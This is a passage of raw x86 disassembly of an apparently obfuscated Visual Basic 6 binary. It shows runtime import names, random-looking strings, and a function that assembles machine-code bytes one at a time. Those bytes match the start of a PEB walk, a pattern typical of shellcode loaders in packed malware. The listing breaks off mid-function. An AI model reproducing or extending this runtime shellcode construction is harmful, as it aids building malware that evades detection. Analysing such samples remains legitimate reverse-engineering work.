  403ed1:	00 00                	add    %al,(%eax)
  403ed3:	00 5f 5f             	add    %bl,0x5f(%edi)
  403ed6:	76 62                	jbe    0x403f3a
  403ed8:	61                   	popa
  403ed9:	41                   	inc    %ecx
  403eda:	72 79                	jb     0x403f55
  403edc:	44                   	inc    %esp
  403edd:	65 73 74             	gs jae 0x403f54
  403ee0:	72 75                	jb     0x403f57
  403ee2:	63 74 00 00          	arpl   %esi,0x0(%eax,%eax,1)
  403ee6:	00 00                	add    %al,(%eax)
  403ee8:	5f                   	pop    %edi
  403ee9:	5f                   	pop    %edi
  403eea:	76 62                	jbe    0x403f4e
  403eec:	61                   	popa
  403eed:	53                   	push   %ebx
  403eee:	74 72                	je     0x403f62
  403ef0:	56                   	push   %esi
  403ef1:	61                   	popa
  403ef2:	72 43                	jb     0x403f37
  403ef4:	6f                   	outsl  %ds:(%esi),(%dx)
  403ef5:	70 79                	jo     0x403f70
  403ef7:	00 14 00             	add    %dl,(%eax,%eax,1)
  403efa:	00 00                	add    %al,(%eax)
  403efc:	70 00                	jo     0x403efe
  403efe:	4f                   	dec    %edi
  403eff:	00 72 00             	add    %dh,0x0(%edx)
  403f02:	56                   	push   %esi
  403f03:	00 47 00             	add    %al,0x0(%edi)
  403f06:	43                   	inc    %ebx
  403f07:	00 4c 00 42          	add    %cl,0x42(%eax,%eax,1)
  403f0b:	00 73 00             	add    %dh,0x0(%ebx)
  403f0e:	47                   	inc    %edi
  403f0f:	00 00                	add    %al,(%eax)
  403f11:	00 00                	add    %al,(%eax)
  403f13:	00 5f 5f             	add    %bl,0x5f(%edi)
  403f16:	76 62                	jbe    0x403f7a
  403f18:	61                   	popa
  403f19:	41                   	inc    %ecx
  403f1a:	72 79                	jb     0x403f95
  403f1c:	55                   	push   %ebp
  403f1d:	6e                   	outsb  %ds:(%esi),(%dx)
  403f1e:	6c                   	insb   (%dx),%es:(%edi)
  403f1f:	6f                   	outsl  %ds:(%esi),(%dx)
  403f20:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  403f23:	00 5f 5f             	add    %bl,0x5f(%edi)
  403f26:	76 62                	jbe    0x403f8a
  403f28:	61                   	popa
  403f29:	41                   	inc    %ecx
  403f2a:	72 79                	jb     0x403fa5
  403f2c:	4c                   	dec    %esp
  403f2d:	6f                   	outsl  %ds:(%esi),(%dx)
  403f2e:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  403f31:	00 00                	add    %al,(%eax)
  403f33:	00 5f 5f             	add    %bl,0x5f(%edi)
  403f36:	76 62                	jbe    0x403f9a
  403f38:	61                   	popa
  403f39:	52                   	push   %edx
  403f3a:	65 64 69 6d 00 00 5f 	gs imul $0x765f5f00,%fs:0x0(%ebp),%ebp
  403f41:	5f 76 
  403f43:	62 61 53             	bound  %esp,0x53(%ecx)
  403f46:	65 74 53             	gs je  0x403f9c
  403f49:	79 73                	jns    0x403fbe
  403f4b:	74 65                	je     0x403fb2
  403f4d:	6d                   	insl   (%dx),%es:(%edi)
  403f4e:	45                   	inc    %ebp
  403f4f:	72 72                	jb     0x403fc3
  403f51:	6f                   	outsl  %ds:(%esi),(%dx)
  403f52:	72 00                	jb     0x403f54
  403f54:	5f                   	pop    %edi
  403f55:	5f                   	pop    %edi
  403f56:	76 62                	jbe    0x403fba
  403f58:	61                   	popa
  403f59:	47                   	inc    %edi
  403f5a:	65 6e                	outsb  %gs:(%esi),(%dx)
  403f5c:	65 72 61             	gs jb  0x403fc0
  403f5f:	74 65                	je     0x403fc6
  403f61:	42                   	inc    %edx
  403f62:	6f                   	outsl  %ds:(%esi),(%dx)
  403f63:	75 6e                	jne    0x403fd3
  403f65:	64 73 45             	fs jae 0x403fad
  403f68:	72 72                	jb     0x403fdc
  403f6a:	6f                   	outsl  %ds:(%esi),(%dx)
  403f6b:	72 00                	jb     0x403f6d
  403f6d:	00 00                	add    %al,(%eax)
  403f6f:	00 5f 5f             	add    %bl,0x5f(%edi)
  403f72:	76 62                	jbe    0x403fd6
  403f74:	61                   	popa
  403f75:	41                   	inc    %ecx
  403f76:	72 79                	jb     0x403ff1
  403f78:	43                   	inc    %ebx
  403f79:	6f                   	outsl  %ds:(%esi),(%dx)
  403f7a:	6e                   	outsb  %ds:(%esi),(%dx)
  403f7b:	73 74                	jae    0x403ff1
  403f7d:	72 75                	jb     0x403ff4
  403f7f:	63 74 32 00          	arpl   %esi,0x0(%edx,%esi,1)
  403f83:	00 08                	add    %cl,(%eax)
  403f85:	00 00                	add    %al,(%eax)
  403f87:	00 4a 00             	add    %cl,0x0(%edx)
  403f8a:	45                   	inc    %ebp
  403f8b:	00 69 00             	add    %ch,0x0(%ecx)
  403f8e:	6b 00 00             	imul   $0x0,(%eax),%eax
  403f91:	00 00                	add    %al,(%eax)
  403f93:	00 0a                	add    %cl,(%edx)
  403f95:	00 00                	add    %al,(%eax)
  403f97:	00 72 00             	add    %dh,0x0(%edx)
  403f9a:	48                   	dec    %eax
  403f9b:	00 4c 00 4f          	add    %cl,0x4f(%eax,%eax,1)
  403f9f:	00 46 00             	add    %al,0x0(%esi)
  403fa2:	00 00                	add    %al,(%eax)
  403fa4:	34 00                	xor    $0x0,%al
  403fa6:	00 00                	add    %al,(%eax)
  403fa8:	31 00                	xor    %eax,(%eax)
  403faa:	32 00                	xor    (%eax),%al
  403fac:	34 00                	xor    $0x0,%al
  403fae:	36 00 35 00 37 00 39 	add    %dh,%ss:0x39003700
  403fb5:	00 38                	add    %bh,(%eax)
  403fb7:	00 34 00             	add    %dh,(%eax,%eax,1)
  403fba:	39 00                	cmp    %eax,(%eax)
  403fbc:	35 00 31 00 36       	xor    $0x36003100,%eax
  403fc1:	00 34 00             	add    %dh,(%eax,%eax,1)
  403fc4:	32 00                	xor    (%eax),%al
  403fc6:	33 00                	xor    (%eax),%eax
  403fc8:	34 00                	xor    $0x0,%al
  403fca:	36 00 37             	add    %dh,%ss:(%edi)
  403fcd:	00 35 00 39 00 31    	add    %dh,0x31003900
  403fd3:	00 35 00 36 00 34    	add    %dh,0x34003600
  403fd9:	00 32                	add    %dh,(%edx)
  403fdb:	00 00                	add    %al,(%eax)
  403fdd:	00 00                	add    %al,(%eax)
  403fdf:	00 2c 00             	add    %ch,(%eax,%eax,1)
  403fe2:	00 00                	add    %al,(%eax)
  403fe4:	37                   	aaa
  403fe5:	00 39                	add    %bh,(%ecx)
  403fe7:	00 34 00             	add    %dh,(%eax,%eax,1)
  403fea:	35 00 34 00 36       	xor    $0x36003400,%eax
  403fef:	00 35 00 32 00 33    	add    %dh,0x33003200
  403ff5:	00 31                	add    %dh,(%ecx)
  403ff7:	00 32                	add    %dh,(%edx)
  403ff9:	00 34 00             	add    %dh,(%eax,%eax,1)
  403ffc:	36 00 37             	add    %dh,%ss:(%edi)
  403fff:	00 39                	add    %bh,(%ecx)
  404001:	00 35 00 34 00 36    	add    %dh,0x36003400
  404007:	00 32                	add    %dh,(%edx)
  404009:	00 31                	add    %dh,(%ecx)
  40400b:	00 33                	add    %dh,(%ebx)
  40400d:	00 34 00             	add    %dh,(%eax,%eax,1)
  404010:	00 00                	add    %al,(%eax)
  404012:	00 00                	add    %al,(%eax)
  404014:	0a 00                	or     (%eax),%al
  404016:	00 00                	add    %al,(%eax)
  404018:	70 00                	jo     0x40401a
  40401a:	41                   	inc    %ecx
  40401b:	00 52 00             	add    %dl,0x0(%edx)
  40401e:	67 00 6f 00          	add    %ch,0x0(%bx)
  404022:	00 00                	add    %al,(%eax)
  404024:	1c 00                	sbb    $0x0,%al
  404026:	00 00                	add    %al,(%eax)
  404028:	78 00                	js     0x40402a
  40402a:	4d                   	dec    %ebp
  40402b:	00 74 00 41          	add    %dh,0x41(%eax,%eax,1)
  40402f:	00 53 00             	add    %dl,0x0(%ebx)
  404032:	62 00                	bound  %eax,(%eax)
  404034:	51                   	push   %ecx
  404035:	00 77 00             	add    %dh,0x0(%edi)
  404038:	72 00                	jb     0x40403a
  40403a:	73 00                	jae    0x40403c
  40403c:	76 00                	jbe    0x40403e
  40403e:	67 00 61 00          	add    %ah,0x0(%bx,%di)
  404042:	68 00 00 00 00       	push   $0x0
  404047:	00 14 00             	add    %dl,(%eax,%eax,1)
  40404a:	00 00                	add    %al,(%eax)
  40404c:	7a 00                	jp     0x40404e
  40404e:	6a 00                	push   $0x0
  404050:	51                   	push   %ecx
  404051:	00 54 00 6f          	add    %dl,0x6f(%eax,%eax,1)
  404055:	00 51 00             	add    %dl,0x0(%ecx)
  404058:	55                   	push   %ebp
  404059:	00 67 00             	add    %ah,0x0(%edi)
  40405c:	4f                   	dec    %edi
  40405d:	00 63 00             	add    %ah,0x0(%ebx)
  404060:	00 00                	add    %al,(%eax)
  404062:	00 00                	add    %al,(%eax)
  404064:	0a 00                	or     (%eax),%al
  404066:	00 00                	add    %al,(%eax)
  404068:	55                   	push   %ebp
  404069:	00 76 00             	add    %dh,0x0(%esi)
  40406c:	52                   	push   %edx
  40406d:	00 74 00 61          	add    %dh,0x61(%eax,%eax,1)
  404071:	00 00                	add    %al,(%eax)
  404073:	00 0e                	add    %cl,(%esi)
  404075:	00 00                	add    %al,(%eax)
  404077:	00 52 00             	add    %dl,0x0(%edx)
  40407a:	52                   	push   %edx
  40407b:	00 42 00             	add    %al,0x0(%edx)
  40407e:	4f                   	dec    %edi
  40407f:	00 71 00             	add    %dh,0x0(%ecx)
  404082:	4a                   	dec    %edx
  404083:	00 70 00             	add    %dh,0x0(%eax)
  404086:	00 00                	add    %al,(%eax)
  404088:	10 00                	adc    %al,(%eax)
  40408a:	00 00                	add    %al,(%eax)
  40408c:	42                   	inc    %edx
  40408d:	00 73 00             	add    %dh,0x0(%ebx)
  404090:	47                   	inc    %edi
  404091:	00 51 00             	add    %dl,0x0(%ecx)
  404094:	7a 00                	jp     0x404096
  404096:	7a 00                	jp     0x404098
  404098:	6d                   	insl   (%dx),%es:(%edi)
  404099:	00 5a 00             	add    %bl,0x0(%edx)
  40409c:	00 00                	add    %al,(%eax)
  40409e:	00 00                	add    %al,(%eax)
  4040a0:	14 00                	adc    $0x0,%al
  4040a2:	00 00                	add    %al,(%eax)
  4040a4:	42                   	inc    %edx
  4040a5:	00 51 00             	add    %dl,0x0(%ecx)
  4040a8:	78 00                	js     0x4040aa
  4040aa:	44                   	inc    %esp
  4040ab:	00 51 00             	add    %dl,0x0(%ecx)
  4040ae:	66 00 55 00          	data16 add %dl,0x0(%ebp)
  4040b2:	41                   	inc    %ecx
  4040b3:	00 76 00             	add    %dh,0x0(%esi)
  4040b6:	77 00                	ja     0x4040b8
  4040b8:	00 00                	add    %al,(%eax)
  4040ba:	00 00                	add    %al,(%eax)
  4040bc:	14 00                	adc    $0x0,%al
  4040be:	00 00                	add    %al,(%eax)
  4040c0:	56                   	push   %esi
  4040c1:	00 78 00             	add    %bh,0x0(%eax)
  4040c4:	46                   	inc    %esi
  4040c5:	00 52 00             	add    %dl,0x0(%edx)
  4040c8:	75 00                	jne    0x4040ca
  4040ca:	4e                   	dec    %esi
  4040cb:	00 74 00 52          	add    %dh,0x52(%eax,%eax,1)
  4040cf:	00 6a 00             	add    %ch,0x0(%edx)
  4040d2:	76 00                	jbe    0x4040d4
  4040d4:	00 00                	add    %al,(%eax)
  4040d6:	00 00                	add    %al,(%eax)
  4040d8:	0a 00                	or     (%eax),%al
  4040da:	00 00                	add    %al,(%eax)
  4040dc:	77 00                	ja     0x4040de
  4040de:	74 00                	je     0x4040e0
  4040e0:	45                   	inc    %ebp
  4040e1:	00 56 00             	add    %dl,0x0(%esi)
  4040e4:	6b 00 00             	imul   $0x0,(%eax),%eax
  4040e7:	00 08                	add    %cl,(%eax)
  4040e9:	00 00                	add    %al,(%eax)
  4040eb:	00 69 00             	add    %ch,0x0(%ecx)
  4040ee:	79 00                	jns    0x4040f0
  4040f0:	5a                   	pop    %edx
  4040f1:	00 70 00             	add    %dh,0x0(%eax)
  4040f4:	00 00                	add    %al,(%eax)
  4040f6:	00 00                	add    %al,(%eax)
  4040f8:	08 00                	or     %al,(%eax)
  4040fa:	00 00                	add    %al,(%eax)
  4040fc:	6c                   	insb   (%dx),%es:(%edi)
  4040fd:	00 4e 00             	add    %cl,0x0(%esi)
  404100:	76 00                	jbe    0x404102
  404102:	4d                   	dec    %ebp
  404103:	00 00                	add    %al,(%eax)
  404105:	00 00                	add    %al,(%eax)
  404107:	00 0c 00             	add    %cl,(%eax,%eax,1)
  40410a:	00 00                	add    %al,(%eax)
  40410c:	59                   	pop    %ecx
  40410d:	00 65 00             	add    %ah,0x0(%ebp)
  404110:	61                   	popa
  404111:	00 6c 00 6f          	add    %ch,0x6f(%eax,%eax,1)
  404115:	00 44 00 00          	add    %al,0x0(%eax,%eax,1)
  404119:	00 00                	add    %al,(%eax)
  40411b:	00 08                	add    %cl,(%eax)
  40411d:	00 00                	add    %al,(%eax)
  40411f:	00 4c 00 42          	add    %cl,0x42(%eax,%eax,1)
  404123:	00 73 00             	add    %dh,0x0(%ebx)
  404126:	47                   	inc    %edi
	...
  40412f:	00 14 00             	add    %dl,(%eax,%eax,1)
  404132:	00 00                	add    %al,(%eax)
  404134:	78 00                	js     0x404136
  404136:	46                   	inc    %esi
  404137:	00 52 00             	add    %dl,0x0(%edx)
  40413a:	75 00                	jne    0x40413c
  40413c:	4e                   	dec    %esi
  40413d:	00 74 00 52          	add    %dh,0x52(%eax,%eax,1)
  404141:	00 6a 00             	add    %ch,0x0(%edx)
  404144:	76 00                	jbe    0x404146
  404146:	6a 00                	push   $0x0
  404148:	00 00                	add    %al,(%eax)
  40414a:	00 00                	add    %al,(%eax)
  40414c:	10 00                	adc    %al,(%eax)
  40414e:	00 00                	add    %al,(%eax)
  404150:	44                   	inc    %esp
  404151:	00 6e 00             	add    %ch,0x0(%esi)
  404154:	55                   	push   %ebp
  404155:	00 59 00             	add    %bl,0x0(%ecx)
  404158:	73 00                	jae    0x40415a
  40415a:	55                   	push   %ebp
  40415b:	00 5a 00             	add    %bl,0x0(%edx)
  40415e:	6e                   	outsb  %ds:(%esi),(%dx)
  40415f:	00 00                	add    %al,(%eax)
  404161:	00 00                	add    %al,(%eax)
  404163:	00 06                	add    %al,(%esi)
  404165:	00 00                	add    %al,(%eax)
  404167:	00 67 00             	add    %ah,0x0(%edi)
  40416a:	65 00 6a 00          	add    %ch,%gs:0x0(%edx)
  40416e:	00 00                	add    %al,(%eax)
  404170:	08 00                	or     %al,(%eax)
  404172:	00 00                	add    %al,(%eax)
  404174:	61                   	popa
  404175:	00 77 00             	add    %dh,0x0(%edi)
  404178:	67 00 72 00          	add    %dh,0x0(%bp,%si)
  40417c:	00 00                	add    %al,(%eax)
  40417e:	00 00                	add    %al,(%eax)
  404180:	06                   	push   %es
  404181:	00 00                	add    %al,(%eax)
  404183:	00 51 00             	add    %dl,0x0(%ecx)
  404186:	6c                   	insb   (%dx),%es:(%edi)
  404187:	00 71 00             	add    %dh,0x0(%ecx)
  40418a:	00 00                	add    %al,(%eax)
  40418c:	10 00                	adc    %al,(%eax)
  40418e:	00 00                	add    %al,(%eax)
  404190:	76 00                	jbe    0x404192
  404192:	4d                   	dec    %ebp
  404193:	00 79 00             	add    %bh,0x0(%ecx)
  404196:	43                   	inc    %ebx
  404197:	00 63 00             	add    %ah,0x0(%ebx)
  40419a:	43                   	inc    %ebx
  40419b:	00 4e 00             	add    %cl,0x0(%esi)
  40419e:	48                   	dec    %eax
  40419f:	00 00                	add    %al,(%eax)
  4041a1:	00 00                	add    %al,(%eax)
  4041a3:	00 5f 5f             	add    %bl,0x5f(%edi)
  4041a6:	76 62                	jbe    0x40420a
  4041a8:	61                   	popa
  4041a9:	55                   	push   %ebp
  4041aa:	49                   	dec    %ecx
  4041ab:	31 49 34             	xor    %ecx,0x34(%ecx)
  4041ae:	00 00                	add    %al,(%eax)
  4041b0:	5f                   	pop    %edi
  4041b1:	5f                   	pop    %edi
  4041b2:	76 62                	jbe    0x404216
  4041b4:	61                   	popa
  4041b5:	49                   	dec    %ecx
  4041b6:	34 53                	xor    $0x53,%al
  4041b8:	74 72                	je     0x40422c
  4041ba:	00 00                	add    %al,(%eax)
  4041bc:	5f                   	pop    %edi
  4041bd:	5f                   	pop    %edi
  4041be:	76 62                	jbe    0x404222
  4041c0:	61                   	popa
  4041c1:	55                   	push   %ebp
  4041c2:	62 6f 75             	bound  %ebp,0x75(%edi)
  4041c5:	6e                   	outsb  %ds:(%esi),(%dx)
  4041c6:	64 00 5f 5f          	add    %bl,%fs:0x5f(%edi)
  4041ca:	76 62                	jbe    0x40422e
  4041cc:	61                   	popa
  4041cd:	4c                   	dec    %esp
  4041ce:	62 6f 75             	bound  %ebp,0x75(%edi)
  4041d1:	6e                   	outsb  %ds:(%esi),(%dx)
  4041d2:	64 00 5f 5f          	add    %bl,%fs:0x5f(%edi)
  4041d6:	76 62                	jbe    0x40423a
  4041d8:	61                   	popa
  4041d9:	56                   	push   %esi
  4041da:	61                   	popa
  4041db:	72 32                	jb     0x40420f
  4041dd:	56                   	push   %esi
  4041de:	65 63 00             	arpl   %eax,%gs:(%eax)
  4041e1:	00 00                	add    %al,(%eax)
  4041e3:	00 5f 5f             	add    %bl,0x5f(%edi)
  4041e6:	76 62                	jbe    0x40424a
  4041e8:	61                   	popa
  4041e9:	41                   	inc    %ecx
  4041ea:	72 79                	jb     0x404265
  4041ec:	4d                   	dec    %ebp
  4041ed:	6f                   	outsl  %ds:(%esi),(%dx)
  4041ee:	76 65                	jbe    0x404255
  4041f0:	00 00                	add    %al,(%eax)
  4041f2:	00 00                	add    %al,(%eax)
  4041f4:	5f                   	pop    %edi
  4041f5:	5f                   	pop    %edi
  4041f6:	76 62                	jbe    0x40425a
  4041f8:	61                   	popa
  4041f9:	41                   	inc    %ecx
  4041fa:	72 79                	jb     0x404275
  4041fc:	56                   	push   %esi
  4041fd:	61                   	popa
  4041fe:	72 00                	jb     0x404200
  404200:	5f                   	pop    %edi
  404201:	5f                   	pop    %edi
  404202:	76 62                	jbe    0x404266
  404204:	61                   	popa
  404205:	41                   	inc    %ecx
  404206:	72 79                	jb     0x404281
  404208:	43                   	inc    %ebx
  404209:	6f                   	outsl  %ds:(%esi),(%dx)
  40420a:	70 79                	jo     0x404285
  40420c:	00 00                	add    %al,(%eax)
  40420e:	00 00                	add    %al,(%eax)
  404210:	5f                   	pop    %edi
  404211:	5f                   	pop    %edi
  404212:	76 62                	jbe    0x404276
  404214:	61                   	popa
  404215:	47                   	inc    %edi
  404216:	65 74 33             	gs je  0x40424c
  404219:	00 00                	add    %al,(%eax)
  40421b:	00 18                	add    %bl,(%eax)
  40421d:	00 00                	add    %al,(%eax)
  40421f:	00 01                	add    %al,(%ecx)
  404221:	00 92 00 08 00 00    	add    %dl,0x800(%edx)
	...
  40422f:	00 7a 00             	add    %bh,0x0(%edx)
	...
  40423a:	00 00                	add    %al,(%eax)
  40423c:	8c 42 40             	mov    %es,0x40(%edx)
  40423f:	00 ff                	add    %bh,%bh
  404241:	ff                   	(bad)
  404242:	ff                   	(bad)
  404243:	ff                   	(bad)
  404244:	ff                   	(bad)
  404245:	ff                   	(bad)
  404246:	ff                   	(bad)
  404247:	ff                   	(bad)
  404248:	ff                   	(bad)
  404249:	ff                   	(bad)
  40424a:	ff                   	(bad)
  40424b:	ff                   	(bad)
  40424c:	ff                   	(bad)
  40424d:	ff                   	(bad)
  40424e:	ff                   	(bad)
  40424f:	ff                   	(bad)
  404250:	ff                   	(bad)
  404251:	ff                   	(bad)
  404252:	ff                   	(bad)
  404253:	ff                   	(bad)
  404254:	ff                   	(bad)
  404255:	ff                   	(bad)
  404256:	ff                   	(bad)
  404257:	ff 00                	incl   (%eax)
  404259:	00 00                	add    %al,(%eax)
  40425b:	00 18                	add    %bl,(%eax)
  40425d:	32 40 00             	xor    0x0(%eax),%al
  404260:	ff                   	(bad)
  404261:	ff                   	(bad)
  404262:	ff                   	(bad)
  404263:	ff 00                	incl   (%eax)
  404265:	00 00                	add    %al,(%eax)
  404267:	00 3c 42             	add    %bh,(%edx,%eax,2)
  40426a:	40                   	inc    %eax
	...
  404277:	00 ff                	add    %bh,%bh
  404279:	ff                   	(bad)
  40427a:	ff                   	(bad)
  40427b:	ff 00                	incl   (%eax)
  40427d:	00 00                	add    %al,(%eax)
  40427f:	00 b0 34 40 00 48    	add    %dh,0x48004034(%eax)
  404285:	34 40                	xor    $0x40,%al
  404287:	00 54 75 40          	add    %dl,0x40(%ebp,%esi,2)
  40428b:	00 00                	add    %al,(%eax)
  40428d:	00 00                	add    %al,(%eax)
  40428f:	00 8c 2e 40 00 ff ff 	add    %cl,-0xffc0(%esi,%ebp,1)
  404296:	ff                   	(bad)
  404297:	ff 00                	incl   (%eax)
	...
  4042a1:	00 00                	add    %al,(%eax)
  4042a3:	00 38                	add    %bh,(%eax)
  4042a5:	42                   	inc    %edx
  4042a6:	40                   	inc    %eax
  4042a7:	00 00                	add    %al,(%eax)
  4042a9:	00 00                	add    %al,(%eax)
  4042ab:	00 38                	add    %bh,(%eax)
  4042ad:	42                   	inc    %edx
  4042ae:	40                   	inc    %eax
  4042af:	00 38                	add    %bh,(%eax)
  4042b1:	42                   	inc    %edx
  4042b2:	40                   	inc    %eax
  4042b3:	00 38                	add    %bh,(%eax)
  4042b5:	42                   	inc    %edx
  4042b6:	40                   	inc    %eax
	...
  4042c3:	00 40 00             	add    %al,0x0(%eax)
  4042c6:	00 00                	add    %al,(%eax)
  4042c8:	04 00                	add    $0x0,%al
  4042ca:	00 00                	add    %al,(%eax)
  4042cc:	cc                   	int3
  4042cd:	cc                   	int3
  4042ce:	cc                   	int3
  4042cf:	cc                   	int3
  4042d0:	e9 e9 e9 e9 cc       	jmp    0xcd2a2cbe
  4042d5:	cc                   	int3
  4042d6:	cc                   	int3
  4042d7:	cc                   	int3
  4042d8:	cc                   	int3
  4042d9:	cc                   	int3
  4042da:	cc                   	int3
  4042db:	cc                   	int3
  4042dc:	cc                   	int3
  4042dd:	cc                   	int3
  4042de:	cc                   	int3
  4042df:	cc                   	int3
  4042e0:	55                   	push   %ebp
  4042e1:	8b ec                	mov    %esp,%ebp
  4042e3:	83 ec 0c             	sub    $0xc,%esp
  4042e6:	68 66 12 40 00       	push   $0x401266
  4042eb:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  4042f1:	50                   	push   %eax
  4042f2:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  4042f9:	83 ec 18             	sub    $0x18,%esp
  4042fc:	53                   	push   %ebx
  4042fd:	56                   	push   %esi
  4042fe:	57                   	push   %edi
  4042ff:	89 65 f4             	mov    %esp,-0xc(%ebp)
  404302:	c7 45 f8 b0 11 40 00 	movl   $0x4011b0,-0x8(%ebp)
  404309:	8b 7d 08             	mov    0x8(%ebp),%edi
  40430c:	8b c7                	mov    %edi,%eax
  40430e:	83 e0 01             	and    $0x1,%eax
  404311:	89 45 fc             	mov    %eax,-0x4(%ebp)
  404314:	83 e7 fe             	and    $0xfffffffe,%edi
  404317:	57                   	push   %edi
  404318:	89 7d 08             	mov    %edi,0x8(%ebp)
  40431b:	8b 0f                	mov    (%edi),%ecx
  40431d:	ff 51 04             	call   *0x4(%ecx)
  404320:	33 db                	xor    %ebx,%ebx
  404322:	89 5d e8             	mov    %ebx,-0x18(%ebp)
  404325:	e8 96 04 00 00       	call   0x4047c0
  40432a:	39 1d 2c 75 40 00    	cmp    %ebx,0x40752c
  404330:	75 10                	jne    0x404342
  404332:	68 2c 75 40 00       	push   $0x40752c
  404337:	68 10 35 40 00       	push   $0x403510
  40433c:	ff 15 24 11 40 00    	call   *0x401124
  404342:	8b 35 2c 75 40 00    	mov    0x40752c,%esi
  404348:	8d 45 e8             	lea    -0x18(%ebp),%eax
  40434b:	57                   	push   %edi
  40434c:	50                   	push   %eax
  40434d:	8b 16                	mov    (%esi),%edx
  40434f:	89 55 d4             	mov    %edx,-0x2c(%ebp)
  404352:	ff 15 68 10 40 00    	call   *0x401068
  404358:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  40435b:	50                   	push   %eax
  40435c:	56                   	push   %esi
  40435d:	ff 51 10             	call   *0x10(%ecx)
  404360:	3b c3                	cmp    %ebx,%eax
  404362:	db e2                	fnclex
  404364:	7d 0f                	jge    0x404375
  404366:	6a 10                	push   $0x10
  404368:	68 00 35 40 00       	push   $0x403500
  40436d:	56                   	push   %esi
  40436e:	50                   	push   %eax
  40436f:	ff 15 44 10 40 00    	call   *0x401044
  404375:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  404378:	ff 15 a4 11 40 00    	call   *0x4011a4
  40437e:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  404381:	68 93 43 40 00       	push   $0x404393
  404386:	eb 0a                	jmp    0x404392
  404388:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  40438b:	ff 15 a4 11 40 00    	call   *0x4011a4
  404391:	c3                   	ret
  404392:	c3                   	ret
  404393:	8b 45 08             	mov    0x8(%ebp),%eax
  404396:	50                   	push   %eax
  404397:	8b 10                	mov    (%eax),%edx
  404399:	ff 52 08             	call   *0x8(%edx)
  40439c:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40439f:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  4043a2:	5f                   	pop    %edi
  4043a3:	5e                   	pop    %esi
  4043a4:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4043ab:	5b                   	pop    %ebx
  4043ac:	8b e5                	mov    %ebp,%esp
  4043ae:	5d                   	pop    %ebp
  4043af:	c2 04 00             	ret    $0x4
  4043b2:	90                   	nop
  4043b3:	90                   	nop
  4043b4:	90                   	nop
  4043b5:	90                   	nop
  4043b6:	90                   	nop
  4043b7:	90                   	nop
  4043b8:	90                   	nop
  4043b9:	90                   	nop
  4043ba:	90                   	nop
  4043bb:	90                   	nop
  4043bc:	90                   	nop
  4043bd:	90                   	nop
  4043be:	90                   	nop
  4043bf:	90                   	nop
  4043c0:	55                   	push   %ebp
  4043c1:	8b ec                	mov    %esp,%ebp
  4043c3:	83 ec 0c             	sub    $0xc,%esp
  4043c6:	68 66 12 40 00       	push   $0x401266
  4043cb:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  4043d1:	50                   	push   %eax
  4043d2:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  4043d9:	83 ec 54             	sub    $0x54,%esp
  4043dc:	53                   	push   %ebx
  4043dd:	56                   	push   %esi
  4043de:	57                   	push   %edi
  4043df:	89 65 f4             	mov    %esp,-0xc(%ebp)
  4043e2:	c7 45 f8 c0 11 40 00 	movl   $0x4011c0,-0x8(%ebp)
  4043e9:	6a 11                	push   $0x11
  4043eb:	8d 45 c8             	lea    -0x38(%ebp),%eax
  4043ee:	33 ff                	xor    %edi,%edi
  4043f0:	68 bc 3e 40 00       	push   $0x403ebc
  4043f5:	50                   	push   %eax
  4043f6:	89 7d e4             	mov    %edi,-0x1c(%ebp)
  4043f9:	89 7d e0             	mov    %edi,-0x20(%ebp)
  4043fc:	89 7d c0             	mov    %edi,-0x40(%ebp)
  4043ff:	89 7d b8             	mov    %edi,-0x48(%ebp)
  404402:	89 7d a8             	mov    %edi,-0x58(%ebp)
  404405:	89 7d a4             	mov    %edi,-0x5c(%ebp)
  404408:	ff 15 98 10 40 00    	call   *0x401098
  40440e:	8b 35 bc 10 40 00    	mov    0x4010bc,%esi
  404414:	b9 64 00 00 00       	mov    $0x64,%ecx
  404419:	ff d6                	call   *%esi
  40441b:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  40441e:	88 01                	mov    %al,(%ecx)
  404420:	b9 a1 00 00 00       	mov    $0xa1,%ecx
  404425:	ff d6                	call   *%esi
  404427:	8b 55 d4             	mov    -0x2c(%ebp),%edx
  40442a:	b9 30 00 00 00       	mov    $0x30,%ecx
  40442f:	88 42 01             	mov    %al,0x1(%edx)
  404432:	ff d6                	call   *%esi
  404434:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  404437:	88 41 02             	mov    %al,0x2(%ecx)
  40443a:	33 c9                	xor    %ecx,%ecx
  40443c:	ff d6                	call   *%esi
  40443e:	8b 55 d4             	mov    -0x2c(%ebp),%edx
  404441:	33 c9                	xor    %ecx,%ecx
  404443:	88 42 03             	mov    %al,0x3(%edx)
  404446:	ff d6                	call   *%esi
  404448:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  40444b:	88 41 04             	mov    %al,0x4(%ecx)
  40444e:	33 c9                	xor    %ecx,%ecx
  404450:	ff d6                	call   *%esi
  404452:	8b 55 d4             	mov    -0x2c(%ebp),%edx
  404455:	b9 8b 00 00 00       	mov    $0x8b,%ecx
  40445a:	88 42 05             	mov    %al,0x5(%edx)
  40445d:	ff d6                	call   *%esi
  40445f:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  404462:	88 41 06             	mov    %al,0x6(%ecx)
  404465:	b9 40 00 00 00       	mov    $0x40,%ecx
  40446a:	ff d6                	call   *%esi
  40446c:	8b 55 d4             	mov    -0x2c(%ebp),%edx
  40446f:	b9 0c 00 00 00       	mov    $0xc,%ecx
  404474:	88 42 07             	mov    %al,0x7(%edx)
  404477:	ff d6                	call   *%esi
  404479:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  40447c:	88 41 08             	mov    %al,0x8(%ecx)
  40447f:	b9 8b 00 00 00       	mov    $0x8b,%ecx
  404484:	ff d6                	call   *%esi
  404486:	8b 55 d4             	mov    -0x2c(%ebp),%edx
  404489:	b9 40 00 00 00       	mov    $0x40,%ecx
  40448e:	88 42 09             	mov    %al,0x9(%edx)
  404491:	ff d6                	call   *%esi
  404493:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
